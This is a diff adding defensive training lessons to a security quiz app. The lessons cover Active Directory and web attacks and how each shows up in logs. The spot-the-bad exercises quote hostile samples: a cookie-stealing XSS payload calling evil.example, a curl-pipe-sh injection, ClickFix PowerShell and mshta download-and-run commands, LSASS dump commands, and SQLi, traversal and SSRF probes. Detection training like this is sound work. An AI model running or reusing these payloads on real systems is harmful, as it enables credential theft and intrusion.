@@ -227,4 +227,148 @@ export const LESSONS = [
     { type: "match", prompt: "Match the port to the service.", pairs: [["22", "SSH"], ["53", "DNS"], ["88", "Kerberos"], ["445", "SMB"], ["3389", "RDP"], ["5985", "WinRM"], ["389", "LDAP"]] },
     { type: "choice", q: "RDP (3389) open to the internet on a file server. Why does it matter?", o: ["It doesn't, RDP is encrypted", "It's one of the most common ransomware entry points: brute force and stolen passwords"], a: 1, why: "Put RDP behind a VPN or gateway with MFA. Never straight on the internet." },
   ] },
+
+  // ---- v6: attack techniques, how they work and how they show up in logs ----
+  { id: "asrep", t: "AS-REP roasting", topic: "Attack techniques", steps: [
+    { type: "read", text: "Some accounts have Kerberos pre-authentication turned off. Anyone can ask the domain controller for a login response for them, and part of that response is encrypted with the account's password. The attacker cracks it offline. No failed logins, no lockouts." },
+    { type: "spot", prompt: "Which events point to AS-REP roasting?", lines: [
+      "4768 TGT requested · user=svc_legacy · PreAuthType=0 · TicketEncryptionType=0x17 · client 10.20.3.7",
+      "4768 TGT requested · user=amy · PreAuthType=2 · TicketEncryptionType=0x12 · client 10.20.1.15",
+      "4768 TGT requested · user=old_scanner · PreAuthType=0 · TicketEncryptionType=0x17 · client 10.20.3.7",
+      "4624 logon · user=amy · type 2"], bad: [0, 2], why: "PreAuthType 0 means no pre-authentication, and 0x17 is RC4, the easy-to-crack encryption. Two such accounts from one workstation within minutes is a roasting run." },
+    { type: "choice", q: "Best fix?", o: ["Turn pre-authentication back on, and give any account that truly needs it a long random password", "Block port 88", "Disable Kerberos"], a: 0, why: "Almost no modern account needs 'Do not require Kerberos preauthentication'. Find them with a quick AD query and fix them." },
+  ] },
+  { id: "pth", t: "Pass-the-hash", topic: "Attack techniques", steps: [
+    { type: "read", text: "Windows NTLM accepts the password hash itself as proof of identity. Steal a hash from one machine (for example from LSASS memory) and you can log on elsewhere as that user, without ever knowing the password." },
+    { type: "spot", prompt: "Which logon looks like pass-the-hash?", lines: [
+      "4624 · type 3 · user=helpdesk_adm · AuthenticationPackage=Kerberos · from WS-HELP01",
+      "4624 · type 9 · user=amy · LogonProcess=seclogo · AuthenticationPackage=Negotiate",
+      "4624 · type 3 · user=helpdesk_adm · AuthenticationPackage=NTLM · KeyLength=0 · from WS-042 (a sales laptop)",
+      "4624 · type 10 · user=it_ops · from JUMP01"], bad: [1, 2], why: "Logon type 9 with seclogo is the classic local sign of tools like Mimikatz sekurlsa::pth. An admin account logging on with NTLM from a laptop it never uses is the remote side." },
+    { type: "choice", q: "What actually stops pass-the-hash spreading?", o: ["Unique local admin passwords (LAPS), tiered admin accounts and Protected Users / Credential Guard", "Longer passwords", "Changing passwords every 30 days"], a: 0, why: "A hash is as good as a password. Stop the same hash working everywhere, and stop admin hashes landing on everyday machines." },
+  ] },
+  { id: "ptt", t: "Pass-the-ticket", topic: "Attack techniques", steps: [
+    { type: "read", text: "Instead of a hash, the attacker steals a Kerberos ticket from memory and injects it into their own session. The ticket works until it expires, usually 10 hours, even if the password is changed." },
+    { type: "choice", q: "A ticket for a domain admin is being used from a workstation the admin never touched. Password reset done. Is the attacker out?", o: ["Yes, the password changed", "No: existing tickets stay valid until they expire. Purge sessions and, for golden tickets, reset KRBTGT twice"], a: 1, why: "Kerberos tickets don't check the password again. Kill the sessions and isolate the machine the ticket was stolen from." },
+    { type: "match", prompt: "Match the technique to what is stolen.", pairs: [["Pass-the-hash", "NTLM hash"], ["Pass-the-ticket", "Kerberos ticket"], ["Golden ticket", "KRBTGT key, to forge any ticket"], ["Kerberoasting", "Service ticket, cracked offline"]] },
+  ] },
+  { id: "dcsync", t: "DCSync", topic: "Attack techniques", steps: [
+    { type: "read", text: "Domain controllers copy password data to each other with a replication protocol. An account with replication rights can ask a DC for any user's hash, including KRBTGT, without touching the DC's disk." },
+    { type: "spot", prompt: "Which event is a DCSync red flag?", lines: [
+      "4662 · object=domainDNS · access=Control Access · properties {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} · by DC02$",
+      "4662 · object=domainDNS · access=Control Access · properties {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} · by helpdesk_adm from WS-042",
+      "4624 · type 3 · user=DC02$"], bad: [1], why: "Replication rights (the DS-Replication-Get-Changes GUIDs) used by a normal admin account from a workstation. Only domain controllers should replicate." },
+    { type: "choice", q: "First thing to check after a confirmed DCSync?", o: ["Which accounts hold replication rights, and assume every hash in the domain is stolen", "Whether antivirus is up to date"], a: 0, why: "DCSync means the attacker can have every password hash. Plan a KRBTGT double reset and privileged password resets." },
+  ] },
+  { id: "llmnr", t: "LLMNR poisoning and NTLM relay", topic: "Attack techniques", steps: [
+    { type: "read", text: "When Windows can't resolve a name through DNS, it shouts on the local network (LLMNR, NBT-NS). An attacker answers 'that's me', and the victim sends its NTLM login. The attacker cracks it or relays it to another server to log in as the victim." },
+    { type: "order", prompt: "Put the attack in order.", items: ["A user mistypes a share name: \\\\fileshrae", "DNS has no answer, so the PC asks the local network via LLMNR", "The attacker's machine replies first", "The PC sends an NTLM authentication to the attacker", "The attacker relays it to a server without SMB signing and logs in as the user"], why: "Every step is normal Windows behaviour. The fix is to switch off the old protocols and require signing." },
+    { type: "choice", q: "Which settings kill this attack?", o: ["Disable LLMNR and NBT-NS, require SMB signing and LDAP signing/channel binding", "Use longer usernames", "Turn on Windows Update"], a: 0, why: "No broadcast name lookups means nothing to poison. Signing means a relayed login is useless." },
+  ] },
+  { id: "lsass", t: "Credential dumping from LSASS", topic: "Attack techniques", steps: [
+    { type: "read", text: "LSASS is the Windows process that holds logged-on users' credentials in memory. Dump its memory and you can pull out hashes, tickets and sometimes passwords. Tools: Mimikatz, procdump, comsvcs.dll MiniDump, Task Manager." },
+    { type: "spot", prompt: "Which command lines are LSASS dumps?", lines: [
+      "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\d.bin full",
+      "procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\l.dmp",
+      "tasklist /svc",
+      "C:\\Program Files\\Backup\\agent.exe --snapshot C:\\"], bad: [0, 1], why: "comsvcs.dll MiniDump against the LSASS process ID, and procdump -ma lsass. Both write a full memory dump to disk." },
+    { type: "choice", q: "Strongest protection?", o: ["Credential Guard and LSA protection (RunAsPPL), plus an EDR rule on any process opening LSASS", "Renaming lsass.exe", "Blocking Task Manager"], a: 0, why: "Credential Guard keeps secrets out of LSASS memory. RunAsPPL blocks most dumping tools. Sysmon 10 or EDR catches the rest." },
+  ] },
+  { id: "sideload", t: "DLL side-loading", topic: "Attack techniques", steps: [
+    { type: "read", text: "A signed, trusted program loads a DLL by name from its own folder. Put a malicious DLL with that name next to it and the trusted program runs the attacker's code. Security tools see a signed program." },
+    { type: "spot", prompt: "Which looks like side-loading?", lines: [
+      "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE loads C:\\Program Files\\...\\Office16\\mso.dll (signed Microsoft)",
+      "C:\\Users\\amy\\AppData\\Local\\Temp\\upd\\OneDriveUpdater.exe loads C:\\Users\\amy\\AppData\\Local\\Temp\\upd\\version.dll (unsigned)",
+      "C:\\ProgramData\\Teams\\Teams.exe loads C:\\ProgramData\\Teams\\msedge_elf.dll (unsigned, created 2 minutes ago)"], bad: [1, 2], why: "Signed programs copied into user-writable folders, loading unsigned DLLs that just appeared next to them." },
+    { type: "choice", q: "Which Sysmon event shows the DLL load?", o: ["Event 7 (image loaded)", "Event 3 (network connection)", "Event 22 (DNS query)"], a: 0, why: "Sysmon 7 records every DLL load with signature status. Filter on unsigned DLLs in user-writable paths." },
+  ] },
+  { id: "inject", t: "Process injection", topic: "Attack techniques", steps: [
+    { type: "read", text: "Malware writes its code into another, legitimate process and runs it there. The code then hides behind a trusted name like explorer.exe or svchost.exe, and inherits its network access." },
+    { type: "match", prompt: "Match the evidence to what it suggests.", pairs: [["Sysmon 8: CreateRemoteThread into explorer.exe", "Classic remote thread injection"], ["notepad.exe making HTTPS connections every 60s", "Injected beacon in a harmless process"], ["svchost.exe with no -k argument, parent is a Word macro", "Process hollowing or masquerading"], ["Sysmon 10: access to lsass.exe with 0x1FFFFF", "Credential theft attempt"]] },
+    { type: "choice", q: "Why are injected processes hard to spot by name?", o: ["The process name and signature are real; only behaviour and parent-child relationships give it away", "They are always invisible"], a: 0, why: "Hunt on behaviour: odd parents, network activity from processes that never talk to the internet, and memory regions that are executable but not backed by a file." },
+  ] },
+  { id: "sqli", t: "SQL injection", topic: "Attack techniques", steps: [
+    { type: "read", text: "When an application builds a database query by pasting in user input, an attacker can change the query itself: read other people's data, bypass logins, or sometimes run commands on the server." },
+    { type: "spot", prompt: "Which web log lines are SQL injection attempts?", lines: [
+      "GET /products?id=42 200",
+      "GET /products?id=42%27%20OR%20%271%27=%271 200",
+      "GET /products?id=42%20UNION%20SELECT%20username,password%20FROM%20users-- 500",
+      "GET /search?q=coffee+beans 200",
+      "GET /products?id=42;WAITFOR%20DELAY%20%270:0:5%27-- 200 (5,012 ms)"], bad: [1, 2, 4], why: "Classic always-true condition, a UNION SELECT to read another table, and a time delay to test blind injection. The 5-second response time is the giveaway." },
+    { type: "choice", q: "The real fix?", o: ["Parameterised queries in the code", "A longer WAF blocklist", "Hiding error messages"], a: 0, why: "A WAF buys time. Parameterised queries remove the bug: input can never become part of the query." },
+  ] },
+  { id: "xss", t: "Cross-site scripting (XSS)", topic: "Attack techniques", steps: [
+    { type: "read", text: "If a site shows user input back on a page without escaping it, an attacker can make the page run their JavaScript in other people's browsers: steal session cookies, act as the user, or show a fake login." },
+    { type: "spot", prompt: "Which requests are XSS probes?", lines: [
+      "GET /search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+      "GET /profile?name=Amy%20O%27Neil",
+      "POST /comment body=<img src=x onerror=fetch('//evil.example/c?'+document.cookie)>",
+      "GET /search?q=%22%3E%3Csvg%2Fonload%3Dalert(document.domain)%3E"], bad: [0, 2, 3], why: "Script tags, event handlers on broken images, and SVG onload. The apostrophe in O'Neil is just a name." },
+    { type: "choice", q: "Which defence limits the damage even if XSS slips through?", o: ["A strict Content Security Policy and HttpOnly cookies", "Disabling right-click", "Using HTTPS"], a: 0, why: "Output escaping fixes the bug. CSP stops injected scripts running, and HttpOnly keeps session cookies away from JavaScript. This site uses both." },
+  ] },
+  { id: "ssrf", t: "SSRF and the cloud metadata service", topic: "Attack techniques", steps: [
+    { type: "read", text: "Server-side request forgery: the attacker makes the server fetch a URL of their choosing. In the cloud, the favourite target is the metadata service at 169.254.169.254, which can hand out the server's temporary cloud credentials." },
+    { type: "spot", prompt: "Which requests are SSRF attempts?", lines: [
+      "POST /api/preview url=https://news.example.com/article",
+      "POST /api/preview url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      "POST /api/preview url=http://localhost:6379/",
+      "POST /api/preview url=http://[::ffff:a9fe:a9fe]/latest/meta-data/"], bad: [1, 2, 3], why: "The metadata IP, a local Redis port, and the same metadata IP written in IPv6 to dodge a simple blocklist." },
+    { type: "choice", q: "Which AWS setting blunts metadata theft?", o: ["Require IMDSv2 (session tokens) on every instance", "Use a bigger instance type", "Turn off CloudTrail"], a: 0, why: "IMDSv2 needs a PUT to get a token first, which most SSRF bugs can't do. Then watch CloudTrail for instance credentials used from outside AWS." },
+  ] },
+  { id: "cmdi", t: "Command injection", topic: "Attack techniques", steps: [
+    { type: "read", text: "An app passes user input to a system shell, for example a 'ping this host' feature. Add a ; or | and the shell runs the attacker's command too, with the app's permissions." },
+    { type: "spot", prompt: "Which inputs are command injection?", lines: [
+      "host=8.8.8.8", "host=8.8.8.8;id", "host=8.8.8.8|curl http://203.0.113.5/s.sh|sh", "host=$(whoami).attacker-dns.example", "host=dns.google"], bad: [1, 2, 3], why: "Command separators, a pipe to download and run a script, and command substitution leaking output through a DNS lookup." },
+    { type: "choice", q: "On the server, what process tree gives it away?", o: ["The web server or app process spawning sh, bash, cmd.exe or powershell", "nginx serving a static file"], a: 0, why: "Web servers should almost never start shells. That parent-child pair is one of the best detections you can write." },
+  ] },
+  { id: "traversal", t: "Path traversal", topic: "Attack techniques", steps: [
+    { type: "read", text: "Using ../ sequences, an attacker walks out of the folder an app means to serve files from and reads anything the app can: config files, keys, password files." },
+    { type: "spot", prompt: "Which requests try path traversal?", lines: [
+      "GET /download?file=report-2026.pdf", "GET /download?file=../../../../etc/passwd", "GET /static/..%2f..%2f..%2fwindows/win.ini", "GET /download?file=....//....//etc/shadow", "GET /images/logo.png"], bad: [1, 2, 3], why: "Plain ../, URL-encoded slashes, and the ....// trick that survives a filter which removes ../ only once." },
+    { type: "choice", q: "A traversal request returned 200 with a large body. Next step?", o: ["Assume the file was read: check what it contained (keys, passwords) and rotate them", "Ignore it, it's just a scan"], a: 0, why: "A 200 on a traversal probe is a breach until proven otherwise. Secrets in readable config files need rotating." },
+  ] },
+  { id: "webshell", t: "Web shells", topic: "Attack techniques", steps: [
+    { type: "read", text: "After exploiting a web server, attackers drop a small script (a web shell) into the web root. Visiting it lets them run commands through ordinary-looking web requests." },
+    { type: "spot", prompt: "Which files in the web root are suspicious?", lines: [
+      "/var/www/html/index.php (modified 3 months ago)", "/var/www/html/uploads/avatar_1123.php (created 02:14 today)", "/var/www/html/wp-content/themes/main/footer.php (modified 02:15 today, runs base64-decoded code through eval)",
+      "/var/www/html/assets/app.min.js (modified with yesterday's deploy)", "C:\\inetpub\\wwwroot\\aspnet_client\\error.aspx (created 02:16 today)"], bad: [1, 2, 4], why: "Scripts in upload folders, a theme file edited at the same minute that runs base64-decoded code, and a new .aspx in a folder nobody uses." },
+    { type: "choice", q: "Best detection for web shells being used?", o: ["The web server process spawning shells or tools (cmd, powershell, whoami, net)", "Counting page views"], a: 0, why: "The file might be hidden, but every command it runs creates a child process of w3wp.exe, php-fpm or apache." },
+  ] },
+  { id: "aitm", t: "Adversary-in-the-middle phishing", topic: "Attack techniques", steps: [
+    { type: "read", text: "The phishing site sits between the user and the real login page, passing everything through. The user signs in and approves MFA for real, and the attacker keeps the session cookie. MFA by app prompt or SMS doesn't stop it." },
+    { type: "spot", prompt: "Which sign-in pattern suggests a stolen session?", lines: [
+      "09:01 amy signs in from 81.2.69.10 (London, company laptop) · MFA passed",
+      "09:02 amy session used from 185.220.101.4 (hosting provider, Netherlands) · no MFA prompt · same session ID",
+      "09:04 new inbox rule 'RSS' moves mail from finance@ to RSS Feeds folder",
+      "12:30 amy signs in from 81.2.69.10 · MFA passed"], bad: [1, 2], why: "The same session moments later from a hosting IP with no new MFA, then an inbox rule hiding finance mail: classic AiTM into BEC." },
+    { type: "choice", q: "Which MFA resists AiTM?", o: ["Passkeys or FIDO2 security keys", "SMS codes", "Push notifications with number matching"], a: 0, why: "Passkeys are bound to the real site's domain, so a proxy site can't use them. Also revoke sessions, not just passwords, after a compromise." },
+  ] },
+  { id: "devcode", t: "Device code phishing", topic: "Attack techniques", steps: [
+    { type: "read", text: "The attacker starts a device-code login (the flow TVs use) and sends the user the code with a pretext: 'enter this code to join the meeting'. The user signs in on the real Microsoft page, and the attacker's device receives the tokens." },
+    { type: "choice", q: "What makes this phish hard to spot?", o: ["The user only ever visits the genuine login site", "It uses a fake website with a bad certificate"], a: 0, why: "There is no lookalike page to catch. The red flag is being asked to enter a code you didn't request." },
+    { type: "choice", q: "Strongest control?", o: ["Block the device code flow with Conditional Access for users who don't need it", "Shorter passwords", "Block microsoft.com"], a: 0, why: "Few office users ever need device code sign-in. Block it, and alert on its use in sign-in logs (authentication protocol = deviceCode)." },
+  ] },
+  { id: "clickfix", t: "ClickFix and fake CAPTCHAs", topic: "Attack techniques", steps: [
+    { type: "read", text: "A web page shows a fake 'verify you are human' or 'fix this error' box. It quietly copies a command to the clipboard and tells the user to press Win+R, paste and Enter. The user runs the malware themselves." },
+    { type: "spot", prompt: "Which RunMRU entries (commands typed into Win+R) are ClickFix?", lines: [
+      "notepad", "powershell -w h -c \"iex(irm https://check-captcha.example/v)\" # I am not a robot - Cloudflare ID 8812", "mshta https://verify-human.example/c.hta  # Verification ID: 4410", "\\\\fileserver\\share"], bad: [1, 2], why: "Download-and-run commands with a reassuring comment at the end, so the user only sees the friendly part in the box." },
+    { type: "choice", q: "Good control for most office staff?", o: ["Restrict PowerShell and mshta for standard users, and teach 'no website ever asks you to paste into Win+R'", "Disable the clipboard"], a: 0, why: "Pair a technical block with one very simple rule people can remember." },
+  ] },
+  { id: "adcs", t: "AD CS certificate abuse (ESC1)", topic: "Attack techniques", steps: [
+    { type: "read", text: "Active Directory Certificate Services issues certificates that can be used to log on. A misconfigured template that lets the requester choose any name (ESC1) means a normal user can request a certificate as a domain admin and log on as them." },
+    { type: "spot", prompt: "Which certificate event is suspicious?", lines: [
+      "4886/4887 · requester=CORP\\amy · template=User · subject=amy",
+      "4887 · requester=CORP\\amy · template=WebServer-Legacy · SAN=administrator@corp.example",
+      "4887 · requester=CORP\\WEB01$ · template=WebServer · subject=web01.corp.example"], bad: [1], why: "A normal user receiving a certificate with the administrator's name in the subject alternative name." },
+    { type: "choice", q: "Fix?", o: ["Remove 'supply in request' from templates that allow client authentication, and restrict who can enrol", "Delete AD CS"], a: 0, why: "Audit templates regularly with tools like Certify or Locksmith, and fix the dangerous combinations." },
+  ] },
+  { id: "byovd", t: "Bring your own vulnerable driver", topic: "Attack techniques", steps: [
+    { type: "read", text: "Attackers install a legitimate but vulnerable signed driver, then use its bug to run code in the kernel and switch off EDR. Ransomware gangs use this right before encryption." },
+    { type: "spot", prompt: "Which events fit BYOVD?", lines: [
+      "7045 service installed · name=RTCore64 · type=kernel driver · path=C:\\Users\\Public\\RTCore64.sys",
+      "7045 service installed · name=Sysmon64 · path=C:\\Windows\\Sysmon64.exe",
+      "EDR sensor stopped reporting from SRV-FS02 at 03:12",
+      "Windows Update installed KB5049981"], bad: [0, 2], why: "A known vulnerable driver loaded from a public folder, then the EDR goes quiet on the same server." },
+    { type: "choice", q: "Best prevention?", o: ["Turn on Microsoft's vulnerable driver blocklist and HVCI (memory integrity)", "Only use 64-bit Windows"], a: 0, why: "The blocklist stops known bad drivers loading. Also alert when any EDR sensor stops checking in." },
+  ] },
 ];
